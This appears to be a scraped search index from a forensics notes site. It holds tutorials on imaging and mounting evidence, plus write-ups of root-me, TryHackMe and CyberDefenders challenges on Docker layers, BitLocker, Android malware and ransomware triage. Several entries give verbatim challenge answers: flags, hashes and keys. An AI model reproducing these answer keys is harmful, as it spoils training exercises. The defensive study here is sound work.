Acceptable Use Policy violation (KAPE) BOB! THIS ISN’T A HORSE! (Volatility) That Kind of Hurt my Feelings (Volatility) Hunt for a nightmare (Volatility) Android malware analysis (Pithus and jadx) iOS forensics (SQLiteDB) CyberDefenders challenges Introduction RedLine Sysinternals Root-me challenges Introduction Command & Control level 2 Docker layers Log analysis web attack Command & Control level 5 Find the cat Ugly duckling Command & Control level 3 Open my vault Command & Control level 4 Job interview Command & Control level 6 Second job interview More practice DFRWS Forensic challenges HN/P challenges Malware traffic analysis exercises Geoguessr (Geolocation game) Books ",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "8d8386c51e76852a58501c2d027013b2",
    "u": "https://dfir.tymyrddin.dev/docs/notes/access",
    "t": "Accessing images ",
    "c": "Accessing images  Filesystem  The Linux kernel supports a large number of filesystems , which can be useful when performing some DFIR tasks. Filesystem support is not necessary when performing forensic acquisition, because the imaging process is operating on the block device below the filesystem and partition scheme. To provide a consistent interface for different types of filesystems, the Linux kernel implements a Virtual File System (VFS) abstraction layer. This allows mounting of regular storage media filesystems ( EXT* , NTFS , FAT , …), network-based filesystems ( nfs , sambafs/smbfs , …), userspace filesystems based on FUSE , stackable filesystems ( encryptfs , unionfs , …), and other special pseudo filesystems ( sysfs , proc , …). Mounting  Filesystems that reside on disk devices in Unix and Linux require explicit mounting before being accessible as a regular directory structure. Mounting a filesystem means it is made available to use with standard file access tools (file managers, applications, …), similar to drive letters in the DOS/Windows world. Linux doesn’t use drive letters; mounted disks become part of the local filesystem and are attached to any chosen part of the filesystem tree, the mount point. To mount a USB stick on an investigator system using ( /mnt ) as the mount point: sudo mount /dev/sdb1 /mnt To unmount, use the umount command (not unmount) with either the device name or the mount point. sudo umount /dev/sdb1 sudo umount /mnt After the filesystem is unmounted, the raw disk is still visible to the kernel and accessible by block device tools, even though the filesystem is not mounted. An unmounted disk is safe to physically detach from an investigator’s acquisition system. Do not attach or mount suspect drives without a write blocker . There is a high risk of modifying, damaging, and destroying digital evidence. Modern OSes will update the last-accessed timestamps as the files and directories are accessed. Any userspace daemons (search indexers, thumbnail generators, and so on) might write to the disk and overwrite evidence, filesystems might attempt repairs, journaling filesystems might write out journal data, and other human accidents might occur. In cases where the Linux kernel does not detect the filesystem, it may have to be explicitly specified. A filesystem will not be correctly detected for any of the following reasons: The filesystem is not supported by the host system (missing kernel module or unsupported filesystem). The partition table is corrupted or missing. The partition has been deleted. The filesystem offset on the disk is unknown. The filesystem needs to be made accessible (unlock device, decrypt partition, and so on). Drives  Attached drives will appear as block devices in the /dev directory when they’re detected by the kernel. Raw disk device files have a specific naming convention: sd* for SCSI and SATA, hd* for IDE, md* for RAID arrays, nvme*n* for NVME drives, and other names for less common or proprietary disk device drivers. Individual partitions discovered by the kernel are represented by numbered raw devices (for example, hda1 , hda2 , sda1 , sda2 , and so forth). When a new device is attached to (or removed from) a host, an interrupt notifies the kernel of a hardware change. The kernel informs the udev system, which creates appropriate devices with proper permissions, executes setup (or removal) scripts and programs, and sends messages to other daemons (via dbus, for example). Forensically acquired image files  Loop devices  Example of creating a block device for an image.raw file: sudo losetup --read-only --find --show image.raw The flags specify that the loop should be --read-only and the next available loop device should be used ( --find ) and displayed on completion ( --show ). The filename specified ( image.raw ) will then become available as an attached block device. Running the losetup command without parameters displays the status of all configured loop devices. These images can be accessed with any tool that operate on block devices. When done, simply detach it: sudo losetup --detach /dev/loop0 It is possible to specify an offset each time running a forensic tool, but it is easier to have a separate device for each partition. You can create a sepa- rate loop device with the losetup command for a specific partition by specifying the correct offset flag ( --offset ) and size flag ( --sizelimit ). A more commonly accepted way is to use the device mapper. Device mapping  The kpartx tool automates the creation of partition devices for a particular image file. A forensically acquired image with four partitions is used in the following example to demonstrate the kpartx tool making mapper devices for each partition: sudo kpartx -r -a -v image.raw The kpartx tool reads the partition table on a disk or image file, creates a loop device for the whole image, and then creates mapper devices for each partition. The -r flag ensures the drive loop and partition mappings are read-only, and the -a flag instructs kpartx to map everything it finds. Use the verbose flag -v to document the command output and to indicate what was just mapped. A loop device is created ( /dev/loop0 ) for the whole image file and is accessible as a raw block device. In addition, partition devices are now available in the /dev/mapper directory, which can be accessed using forensic tools that operate on partitions, without specifying any offsets. Some commands for such partitions: sudo fsstat /dev/mapper/loop0p3 sudo mkdir p3 sudo mount --read-only /dev/mapper/loop0p3 p3 sudo mc ./p3 ... sudo umount p3 sudo rmdir p3 When the drive loop and partition mappings are no longer needed, remove them all by using the kpartx delete ( -d ) flag: sudo kpartx -d image.raw The loop and mappings are deleted, not the drive image, and the drive image is not modified. Forensic format images  The ewflib software package includes a tool called ewfmount to “mount” the contents of a forensic image, making it accessible as a regular raw image file. As root: mkdir raw ewfmount image.E01 raw ls -l raw hexedit -s raw/ewf1 kpartx -r -a -v raw/ewf1 sudo mkdir p1 mount --read-only /dev/mapper/loop0p1 p1 ls p1 ... umount p1 kpartx -d raw/ewf1 fusermount -u raw rmdir p1 raw xmount  The xmount (crossmount) tool creates a virtual disk image that can be booted using VM software like VirtualBox or kvm- qemu . The tool simulates a read-write drive, but it protects the image in a read-only state. Multiple VM output formats are possible, including raw, dmg, vdi, vhd, vmdk, and vmdks. VM images  Accessing common VM image file types such as qcow2, vdi, vmdk, and vhd. QEMU QCOW2  The libqcow-utils package contains the qcowinfo and qcowmount tools. Both can be used in the same way as ewfinfo and ewfmount tools. Given a *.qcow2 file, the qemu-img command can provide a summary of the file: qemu-img info image.qcow2 To access a qcow image in a raw image representation with nbd , load the nbd kernel module (or autoload the nbd module at boot by adding it to the /etc/modules file): modprobe nbd dmesg | grep nbd qemu-nbd --read-only --connect /dev/nbd0 image.qcow2 dmesg | grep nbd0 mmls /dev/nbd0 fls /dev/nbd0p1 mkdir p1 mount /dev/nbd0p1 p1 ls p1 ... umount p1 qemu-nbd --read-only --disconnect /dev/nbd0 rmdir p1 VirtualBox VDI  The VirtualBox software package includes a number of utilities; the VBoxManage tool provides information about the VDI image: VBoxManage showhdinfo image.vdi The same qemu-nbd command can be used: qemu-nbd -c /dev/nbd0 image.vdi dmesg VMWare VMDK  Retrieve information about the assembled image and each of the “Extents” using vmdkinfo : vmdkinfo image.vmdk mkdir whatever vmdkmount image.vmdk whatever ls -ls whatever mmls whatever/vmdk1 Using kpartx , will create the associated disk and partition block devices. You can then use forensic analysis tools on them directly or mount them on the local machine to browse the filesystem. Microsoft VHD...",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "58a72924c8503a88cee076a3accd4337",
    "u": "https://dfir.tymyrddin.dev/docs/root-me/interview2",
    "t": "Second job interview ",
    "c": "Second job interview  root-me challenge : After passing the first interview with flying colors you are now called in again. You’ve got to analyse a new file. What? ┌──(kali㉿kali)-[~/Downloads/root-me/forensic/interview2] └─$ file forensic.E01 forensic.E01: EWF/Expert Witness/EnCase image file format ┌──(kali㉿kali)-[~/Downloads/root-me/forensic/interview2] └─$ ewfinfo forensic.E01 ewfinfo 20140813 Acquiry information Case number: 2 Description: Root-me Challenge - Level : Forensic of course !!! Examiner name: makhno - IT forensic investigator Evidence number: 1 Notes: A Microsoft encryption ... ;-) Acquisition date: Sat Jul 2 17:27:33 2016 System date: Sat Jul 2 17:27:33 2016 Operating system used: Linux Software version used: 20140608 Password: N/A EWF information File format: EnCase 6 Sectors per chunk: 64 Error granularity: 64 Compression method: deflate Compression level: best compression Set identifier: 2c3d379a-f2df-8b49-b866-6ff5817fe4a2 Media information Media type: fixed disk Is physical: yes Bytes per sector: 512 Number of sectors: 1202180 Media size: 587 MiB (615516160 bytes) Digest hash information MD5: 9f6a0da4d8658c0980d97627be8f6eb9 Extract the FVEK from the memory dump using the bitlocker plugin for volatility (or another tool). Cipher : AES-128 FVEK : e7e576581fe26aa7c71a7e711c778da2 TWEAK : b72f4e075edb7e734dfb08638cf29652 And mount with bdemount .",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "34b48f3631a99e1fcade93960a98ba03",
    "u": "https://dfir.tymyrddin.dev/docs/thm/android",
    "t": "Android malware analysis (Pithus and jadx) ",
    "c": "Android malware analysis (Pithus and jadx)  This static analysis sample case study is for a trojanised application uploaded in Pithus (online analysis) ). The sample for local analysis with jadx can be downloaded here . First steps (Pithus)  Name package: Hashes (MD5 and SHA256): Size of the package: Getting into the APK  With some quick online research, we can find that the 3.65.979 version was released on 1 March 2021 . The X.509 certificate was created to work from 26 April 2021, and the oldest files from the samples were identified around that time. Two months after the release of the version of the legit APK. In the APK Analysis tab of Pithus, we can find the main activity for this application: ['org.xmlpush.v3.StartVersion', 'com.waz.zclient.LaunchActivity', 'com.waz.zclient.MainActivity', 'com.waz.zclient.calling.CallingActivity', 'com.waz.zclient.preferences.PreferencesActivity', 'com.waz.zclient.PopupActivity', 'com.waz.zclient.ShareActivity', 'com.waz.zclient.controllers.notifications.ShareSavedImageActivity', 'com.waz.zclient.appentry.AppEntryActivity', 'com.waz.zclient.ForceUpdateActivity', 'com.waz.zclient.conversation.folders.moveto.MoveToFolderActivity', 'androidx.biometric.DeviceCredentialHandlerActivity', 'com.google.android.gms.common.api.GoogleApiActivity'] Activities: org.xmlpush.v3.StartVersion com.waz.zclient.LaunchActivity com.waz.zclient.MainActivity com.waz.zclient.calling.CallingActivity com.waz.zclient.preferences.PreferencesActivity com.waz.zclient.PopupActivity com.waz.zclient.ShareActivity com.waz.zclient.controllers.notifications.ShareSavedImageActivity com.waz.zclient.appentry.AppEntryActivity com.waz.zclient.ForceUpdateActivity com.waz.zclient.conversation.folders.moveto.MoveToFolderActivity androidx.biometric.DeviceCredentialHandlerActivity com.google.android.gms.common.api.GoogleApiActivity org.xmlpush.v3.StartVersion stands out from the crowd. The Java method org.xmlpush.v3.q.c.a() is meant for reconfiguring SMS. In the same tab, in the section on Manifest analysis , three actions are triggered by this activity: Check the Behavior Analysis tab: This APK is requesting an extensive amount of permissions. This might not be entirely suspicious, depending on what this application is doing. The Threat analysis section on that page is based on Quark . The first crime identified: And contains this unbelievable action (making it hard for a user to find the app in the menu): The Behavior analysis section on the Behavior analysis tab contains Tcp sockets : Only okio/Okio.java is probably not malicious. The Okio library is built on top of Java’s InputStream and OutputStream classes, and provides a higher-level API for working with these types of streams. It also includes support for working with other data sources, such as files, sockets, and in-memory data structures. The Network Analysis tab shows domains that have been identified and are queried by the APK. More advanced malware will obfuscate the domain or IP it communicates to avoid detection, and in such cases this tab does not reveal much. Hunting  Continuing the research to find other samples that are identical or similar to the first sample. This can give an understanding of the type of victims being targeted and the Tactics, Techniques, and Procedures (TTPs) malicious actor(s) are using. In the Fingerprints tab, scroll down to the SSdeep and Dexofuzzy results and click on the magnifying glass on the right. Dexofuzzy gives results, and the Threat Intel tab a little more, but the link to VirusTotal reveals vendors do not detect maliciousness in similar files. Logging in in Pithus, you can create Yara rules for hunting. Pithus only supports vanilla Yara for the moment. If you try to use modules, it will not work. Search (Pithus)  On the home page of Pithus, there is a query field available. The help button is essential. For example, to search for the sha256 hash of the sample: sha256:ae05bbd31820c566543addbb0ddc7b19b05be3c098d0f7aa658ab83d6f6cd5c8 To search for the non-malicious class that was identified: java_classes:okio/okio First steps (jadx)  Package name and version: Application name: Signing certificate  If permitted by your internal guidelines, you can search for the SHA256 of the sample on multiple online services such as VirusTotal, or download the legit version of the app , also for other comparisons (like permissions). SHA-256 Fingerprint Valid from E1 4F 25 46 56 FF 86 9B B7 38 AE C5 86 56 04 21 71 C8 62 5C 9D EF BC C6 EB 4F 24 D4 1D 4E C9 29 Mon Apr 26 12:51:28 CEST 2021 16 26 E3 F8 5D FD 84 34 F7 86 66 44 48 61 F4 E5 C8 FB 37 7A 28 4C 1C 30 4C B9 D5 85 28 8F A3 52 Tue Feb 12 12:53:31 CET 2013 Requested permissions  Review the permissions and assess if these are legitimate permissions for the app’s purpose. Instincts and gut feelings are worth investigating. Does this app really need to be able to write, send and receive SMS messages? Frosting  The short analysis with Pithus gave us that the sample is not frosted . FinSpy  VirusTotal results: Pithus hunt: Resources  Manifest.permission Permissions on Android Android app permissions explained and how to use them FinSpy spyware analysis (similar sample)",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "7e462d2f139bf45ab5a10534eeaed8a1",
    "u": "https://dfir.tymyrddin.dev/docs/thm/ioc-collector",
    "t": "IOC Search Collector (Redline) ",
    "c": "IOC Search Collector (Redline)  What is the actual filename of the Keylogger? Answer: psylog.exe What filename is the file masquerading as? Get the info from the file with the most hits. Answer: THM1768.exe Who is the owner of the file? Answer: WIN-2DET5DP0NPT\\charles What is the file size in bytes? Answer: 35400 Provide the full path of where the .ioc file was placed after the Redline analysis, include the .ioc filename as well Analysis report pane: Answer: C:\\Users\\charles\\Desktop\\Keylogger-IOCSearch\\IOCs\\keylogger.ioc Resources  IOC Editor User Guide",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "41846d6a851de2d91413c9b1008d4e7f",
    "u": "https://dfir.tymyrddin.dev/docs/root-me/cat",
    "t": "Find the cat ",
    "c": "Find the cat  root-me challenge : The president’s cat was kidnapped by separatists. A suspect carrying a USB key has been arrested. Berthier, once again you have to save the Republic! Analyze this key and find out in which city the cat is retained! The md5sum of the archive is edf2f1aaef605c308561888079e7f7f7 . Input the city name in lowercase. What is it? ┌──(kali㉿kali)-[~/Downloads/root-me/forensic] └─$ file chall9 chall9: DOS/MBR boot sector; partition 1 : ID=0xb, start-CHS (0x0,32,33), end-CHS (0x10,81,1), startsector 2048, 260096 sectors, extended partition table (last) ┌──(kali㉿kali)-[~/Downloads/root-me/forensic] └─$ fdisk -l chall9 Disk chall9: 128 MiB, 134217728 bytes, 262144 sectors Units: sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disklabel type: dos Disk identifier: 0xc5ce543f Device Boot Start End Sectors Size Id Type chall9p1 2048 262143 260096 127M b W95 FAT32 Write the partition as separate image. ┌──(kali㉿kali)-[~/Downloads/root-me/forensic] └─$ dd if=chall9 of=chall9_p1 bs=512 skip=2048 count=260096 Mount the image: ┌──(kali㉿kali)-[~/Downloads/root-me/forensic] └─$ sudo mount chall9_p1 /dev/disk [sudo] password for kali: ┌──(kali㉿kali)-[~/Downloads/root-me/forensic] └─$ ls /dev/disk by-diskseq by-uuid Documentations Files WebSites ┌──(kali㉿kali)-[~/Downloads/root-me/forensic] └─$ ls /dev/disk/Documentations Barbey_Cigognes_BDC.pdf 'mangeur-de-cigogne (1).pdf' m-flamm.pdf brasserie_jo_dinner_menu.pdf mangeur-de-cigogne.pdf tartes_flambee_a_volonte_francais_2013.pdf Courba13-01.pdf 'Menu AC.pdf' texte_migration_des_cigognes.pdf ┌──(kali㉿kali)-[~/Downloads/root-me/forensic] └─$ sudo umount /dev/disk Alas. Maybe deleted? ┌──(kali㉿kali)-[~/Downloads/root-me/forensic] └─$ testdisk chall9_p1 Copy ( C ) revendications.odt , and open it: Save the graphics in the file as cat.jpg , use exiftool cat.jpg to get its GPS Position , and look up the name of the location.",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "b34893b36bf36fe33e3f0f6ef8482e7b",
    "u": "https://dfir.tymyrddin.dev/docs/cd/sysinternals",
    "t": "Sysinternals ",
    "c": "Sysinternals  Scenario  Cyber Defenders Sysinternals challenge : A user thought they were downloading the SysInternals tool suite and attempted to open it, but the tools did not launch and became inaccessible. Since then, the user has observed that their system has gradually slowed down and become less responsive. Tools used  Eric Zimmerman’s Tools VirusTotal Autopsy Questions  Q1 What was the malicious executable file name that the user downloaded? Q2 When was the last time the malicious executable file was modified? 12-hour format Q3 What is the SHA1 hash value of the malware? Extract /img_SysInternals.E01/Windows/appcompat/Programs/Amcache.hve . Then use Zimmerman’s AmcacheParser: .\\AmcacheParser.exe -f \"F:\\Tmp\\Amcache.hve\" --csv F:\\Tmp Q4 What is the malware’s family? VirusTotal family labels Q5 What is the first mapped domain’s Fully Qualified Domain Name (FQDN)? VirusTotal FQDM most detected Q6 The mapped domain is linked to an IP address. What is that IP address? Q7 What is the name of the executable dropped by the first-stage executable? Q8 What is the name of the service installed by 2nd stage executable? Q9 What is the extension of files deleted by the 2nd stage executable? Nasty, nasty question. Either run the sample in a sandbox, or search for the answer on the internet in analysis reports of the malware. pf.",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "2540bf6ab849ea40cab3961f7c3d2b5c",
    "u": "https://dfir.tymyrddin.dev/docs/notes/acquisition",
    "t": "Image acquisition ",
    "c": "Image acquisition  Maximizing the amount of data extracted from a storage medium, minimising the disturbance to the storage device and medium, preserving the collected evidence, and documenting the process (including errors). Assumptions : The storage device is physically attached to the forensics examiner’s acquisition workstation. The storage device has been positively identified. The appropriate write-blocking mitigation is in place to prevent modification of the subject drive. Disk capacity planning has been performed to ensure disk space is not an issue. dd tools  Standard dd  To copy a disk block device to a file: # dd if=/dev/sde of=image.raw with protection from unreadable blocks by skipping ( noerror ) and padding them with zeros ( sync ): # dd if=/dev/sde of=image.raw conv=noerror,sync dcfldd  To image a disk, ensuring blocks containing unreadable sectors are padded: # dcfldd if=/dev/sde of=image.raw conv=noerror,sync errlog=error.log dc3dd  To image a disk, adding the conv=noerror,sync flag is not needed because it is built in: # dc3dd if=/dev/sde of=image.raw log=error.log Traditional dd has no capability for hashing, logging to a file, or other features handy for forensic acquisition. Both dcfldd and dc3dd have additional features for cryptographic hashing, image splitting, and piping to external programs. Forensic formats  Several imaging formats, like FTK and EnCase for example, were specifically designed with forensics in mind. These are commercial proprietary formats and have been reverse engineered to allow development of open source–compatible tools. ewfacquire  libewf is a library to access the Expert Witness Compression Format (EWF). Its ewfacquire tool creates acquisition files that enable interoperability with EnCase, FTK, and Sleuth Kit. The tool can also convert raw images into other formats. To acquire an attached disk device (a MacBook Air connected to the examiner workstation in Target Disk Mode with a Thunderbolt-to-FireWire adapter): # ewfacquire -c best -t /exam/macbookair /dev/sdf ftkimager  The ftkimager tool can take input from a raw device, a file, or stdin . It outputs to an FTK SMART format, an EnCase EWF format, or stdout . A number of other features are supported, including the addition of case metadata into the saved formats, compression, output file splitting (“image fragments”), hashing, and encrypted images. Example: # ftkimager /dev/sdf --s01 --description \"serial number and model string\" sandisk The ftkimager creates a log file with basic metadata and any additional information that was added using flags on the command line. SquashFS forensic evidence container  Configure sfsimage to use dc3dd as the imaging tool by editing the DD variable in the beginning of the shell script: DD=\"dc3dd if=$DDIN log=errorlog.txt hlog=hashlog.txt hash=md5\" Then the block device can be imaged using the -i flag: $ sfsimage -i /dev/sde philips-usb-drive.sfs The size of the compressed *.sfs file: $ ls -lh *.sfs Cryptographic hashing  The cryptographic hashing of forensic images is typically included as part of the imaging process. # dcfldd if=/dev/sde of=image.raw conv=noerror,sync hash=md5,sha256 # dc3dd if=/dev/sde of=image.raw hash=md5 hash=sha1 hash=sha512 # dd if=/dev/sde | tee image.raw | md5sum When imaging an older or damaged disk, block read errors can occur. These errors can happen in random places during the acquisition, and the frequency can increase over time, and the cryptographic hash might be different each time the disk is read. The solution to this problem is to use hash windows, or piecewise hashing. # dcfldd if=/dev/sde of=image.raw conv=noerror,sync hashwindow=1M # dc3dd if=/dev/sda hof=image.raw ofs=image.000 ofsz=1G hlog=hash.log hash=md5 Signing images  Cryptographic signing of forensic images binds a person (or that person’s key) to the integrity of the image. Sign the log output containing the MD5 hash and other details: $ gpg --clearsign hash.log $ cat hash.log.asc The gpgsm tool is part of GnuPG2 and supports managing X.509 keys, encryption, and signatures using the S/MIME standard. Once the necessary keys have been generated and certificates have been installed, you can use gpgsm to sign files in a similar manner to GPG: $ gpgsm -a -r username@example.com -o hash.log.pem --sign hash.log Timestamping  n some cases, it is also useful to bind the forensic acquisition results to a specific point in time. Timestamping is a formal standard defined in RFC-3161, which describes the format of a timestamp request and response. OpenSSL can create and send timestamp requests and verify responses. To request an RFC-3161 compliant timestamp for the acquisition log: $ openssl ts -query -data hash.log -out hash.log.tsq -cert This timestamp request contains a hash of the hash.log file, not the actual file. The file is not sent to the timestamping server. This is important from an information security perspective. The timestamp service provider is only trusted with timestamp information, not the contents of the files being timestamped. The generated request can then be sent to a timestamping service using the tsget command included with OpenSSL: $ tsget -h https://freetsa.org/tsr hash.log.tsq If the timestamping server accepts the request, it returns an RFC-3161 compliant timestamp. To view it: $ openssl ts -reply -in hash.log.tsr -text",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "02047277fdb883da4062a3efd6d614ca",
    "u": "https://dfir.tymyrddin.dev/docs/root-me/docker-layers",
    "t": "Docker layers ",
    "c": "Docker layers  root-me challenge : I lost the password I used to encrypt my secret flag file. Could you help me to recover it ? What? ┌──(kali㉿kali)-[~/Downloads/root-me/forensic/docker-layer] └─$ container-diff analyze -t history ch29.tar -----History----- Analysis for ch29.tar: -/bin/sh -c #(nop) ADD file:d2abf27fe2e8b0b5f4da68c018560c73e11c53098329246e3e6fe176698ef941 in / -/bin/sh -c #(nop) CMD [\"bash\"] -/bin/sh -c apt update -y -/bin/sh -c apt install -y curl openssl -/bin/sh -c #(nop) COPY file:2ca89eb39686ffcc3d2d87bbc9293559252cff471f80c2ed5d024b214f9a6fa3 in / -/bin/sh -c echo -n $(curl -s https://pastebin.com/raw/P9Nkw866) | openssl enc -aes-256-cbc -iter 10 -pass pass:$(cat /pass.txt) -out flag.enc -/bin/sh -c rm /pass.txt Unpack: ┌──(kali㉿kali)-[~/Downloads/root-me/forensic/docker-layer] └─$ tar -xf ch29.tar ┌──(kali㉿kali)-[~/Downloads/root-me/forensic/docker-layer] └─$ ll total 238916 drwxr-xr-x 2 kali kali 4096 May 9 03:16 1bbd61a572ad5f5e2ac0f073465d10dc1c94a71359b0adfd2c105be4c1cb2507 -r--r--r-- 1 kali kali 2048 Dec 31 1969 316bbb8c58be42c73eefeb8fc0fdc6abb99bf3d5686dd5145fc7bb2f32790229.tar -r--r--r-- 1 kali kali 2048 Dec 31 1969 3309d6da2bd696689a815f55f18db3f173bc9b9a180e5616faf4927436cf199d.tar -r--r--r-- 1 kali kali 75156480 Dec 31 1969 4942a1abcbfa1c325b1d7ed93d3cf6020f555be706672308a4a4a6b6d631d2e7.tar drwxr-xr-x 2 kali kali 4096 May 9 03:16 5bcc45940862d5b93517a60629b05c844df751c9187a293d982047f01615cb30 -r--r--r-- 1 kali kali 16729088 Dec 31 1969 743c70a5f809c27d5c396f7ece611bc2d7c85186f9fdeb68f70986ec6e4d165f.tar drwxr-xr-x 2 kali kali 4096 May 9 03:16 82ba49da0bd5d767f35d4ae9507d6c4552f74e10f29777a2a27c97778962476d -r--r--r-- 1 kali kali 1536 Dec 31 1969 8d364403e7bf70d7f57e807803892edf7304760352a397983ecccb3e76ca39fa.tar drwxr-xr-x 2 kali kali 4096 May 9 03:16 8f0d75885373613641edc42db2a0007684a0e5de14c6f854e365c61f292f3b4d -r--r--r-- 1 kali kali 2439 Dec 31 1969 b324f85f8104bfebd1ed873e90437c0235d7a43f025a047d5695fe461da717c6.json -r--r--r-- 1 kali kali 30390272 Dec 31 1969 b58c5e8ccaba8886661ddd3b315989f5cf7839ea06bbe36547c6f49993b0d0aa.tar drwxr-xr-x 2 kali kali 4096 May 9 03:16 ca7f60c6e2a66972abcc3147da47397d1c2edb80bddf0db8ef94770ed28c5e16 -rw-r--r-- 1 kali kali 122307584 May 9 03:03 ch29.tar drwxr-xr-x 2 kali kali 4096 May 9 03:16 db04fe239ab708e4ab56ea0e5c1047449b7ea9e04df9db5b1b95d00c6980ff3f -r--r--r-- 1 kali kali 573 Dec 31 1969 manifest.json -r--r--r-- 1 kali kali 111 Dec 31 1969 repositories Find pass.txt : ┌──(kali㉿kali)-[~/Downloads/root-me/forensic/docker-layer] └─$ cd 82ba49da0bd5d767f35d4ae9507d6c4552f74e10f29777a2a27c97778962476d ┌──(kali㉿kali)-[~/…/root-me/forensic/docker-layer/82ba49da0bd5d767f35d4ae9507d6c4552f74e10f29777a2a27c97778962476d] └─$ tar -xf layer.tar ┌──(kali㉿kali)-[~/…/root-me/forensic/docker-layer/82ba49da0bd5d767f35d4ae9507d6c4552f74e10f29777a2a27c97778962476d] └─$ ls json layer.tar pass.txt VERSION Find flag.enc : ┌──(kali㉿kali)-[~/Downloads/root-me/forensic/docker-layer] └─$ cd ca7f60c6e2a66972abcc3147da47397d1c2edb80bddf0db8ef94770ed28c5e16 ┌──(kali㉿kali)-[~/…/root-me/forensic/docker-layer/ca7f60c6e2a66972abcc3147da47397d1c2edb80bddf0db8ef94770ed28c5e16] └─$ tar -xf layer.tar ┌──(kali㉿kali)-[~/…/root-me/forensic/docker-layer/ca7f60c6e2a66972abcc3147da47397d1c2edb80bddf0db8ef94770ed28c5e16] └─$ ls flag.enc json layer.tar VERSION Decode the flag with: ┌──(kali㉿kali)-[~/Downloads/root-me/forensic/docker-layer] └─$ cat pass.txt ┌──(kali㉿kali)-[~/Downloads/root-me/forensic/docker-layer] └─$ openssl enc -aes-256-cbc -iter 10 -d -in flag.enc -out flag.txt enter AES-256-CBC decryption password:",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "5e33f96b3f84fc75b6221c7488fbb1fa",
    "u": "https://dfir.tymyrddin.dev/docs/thm/windows10",
    "t": "Windows 10 disk image (Autopsy) ",
    "c": "THM Rooms: Autopsy (1 and 2) Windows 10 disk image (Autopsy)  In the attached VM, there is an Autopsy case file and its corresponding disk image. After loading the .aut file, make sure to re-point Autopsy to the disk image file. Ingest Modules were already ran for your convenience. The task is to perform a manual analysis of the artifacts discovered by Autopsy to answer the questions below. Questions  What is the MD5 hash of the E01 image? Answer: 3f08c518adb3b5c1359849657a9b2079 What is the computer account name? Answer: DESKTOP-0R59DJ3 List all the user accounts. (alphabetical order) Answer: H4S4N,joshwa,keshav,sandhya,shreya,sivapriya,srini,suba Who was the last user to log into the computer? Answer: sivapriya What was the IP address of the computer? See Look@LAN in Program Files(x86) : Answer: 192.168.130.216 What was the MAC address of the computer? (XX-XX-XX-XX-XX-XX) Answer: 08-00-27-2c-c4-b9 What is the name of the network card on this computer? Search for Ethernet in Keyword Search : Answer: Intel(R) PRO/1000 MT Desktop Adapter What is the name of the network monitoring tool? Answer: Look@LAN A user bookmarked a Google Maps location. What are the coordinates of the location? Web Bookmarks : Answer: 12°52'23.0\"N 80°13'25.0\"E A user has his full name printed on his desktop wallpaper. What is the user’s full name? Images/Videos : Answer: Anto Joshwa A user had a file on her desktop. It had a flag, but she changed the flag using PowerShell. What was the first flag? Check the powershell history for each user: Users -> user -> AppData -> Roaming -> Microsoft -> Windows -> PowerShell -> PSReadLine -> ConsoleHost_history.txt Answer: flag{HarleyQuinnForQueen} The same user found an exploit to escalate privileges on the computer. What was the message to the device owner? Answer: flag{I-hacked-you} 2 hack tools focused on passwords were found in the system. What are the names of these tools? (alphabetical order) Windows Defender -> Scans -> History -> Service -> DetectionHistory Answer: Lazagne, Mimikatz There is a YARA file on the computer. Inspect the file. What is the name of the author? Keyword Search for .yar : Answer: Benjamin DELPY (gentilkiwi) One of the users wanted to exploit a domain controller with an MS-NRPC based exploit. What is the filename of the archive that you found? (include the spaces in your answer) Search for a document on Zerologon in Recent Documents : Answer: 2.2.0 20200918 Zerologon encrypted.zip",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "7354326a60096e5a01f9bdd93cb33b38",
    "u": "https://dfir.tymyrddin.dev/docs/thm/endpoint",
    "t": "Endpoint investigation (Redline) ",
    "c": "Endpoint investigation (Redline)  Scenario: A Senior Accountant, Charles, is complaining that he cannot access the spreadsheets and other files he has been working on. He also mentioned that his wallpaper got changed with the saying that his files got encrypted. This is not good news! Are you ready to perform the memory analysis of the compromised host? You have all the data you need to do some investigation on the victim’s machine. Let’s go hunting! Task: Navigate to the folder on your desktop titled Endpoint Investigation. Double-click on the AnalysisSession1.mans file. The data will be imported automatically into Redline. Analyze the file to answer the questions below. Note: Give it up to 10 minutes for all the data import. Questions  Can you identify the product name of the machine? Go to System Information : Answer: Windows 7 Home Basic Can you find the name of the note left on the Desktop for the “Charles”? Answer: _R_E_A_D___T_H_I_S___AJYG1O_.txt Find the Windows Defender service; what is the name of its service DLL? Answer: MpSvc.dll The user manually downloaded a zip file from the web. Can you find the filename? Answer: eb5489216d4361f9e3650e6a6332f7ee21b0bc9f3f3a4018c69733949be1d481.zip Provide the filename of the malicious executable that got dropped on the user’s Desktop. Answer: Endermanch@Cerber5.exe Provide the MD5 hash for the dropped malicious executable. Answer: fe1bc60a95b2c2d77cd5d232296a7fa4 What is the name of the ransomware? Answer: Cerber Resources  Redline User Guide",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "549e571828668dbb9d6ca3cbcdc1b871",
    "u": "https://dfir.tymyrddin.dev/docs/root-me/interview1",
    "t": "Job interview ",
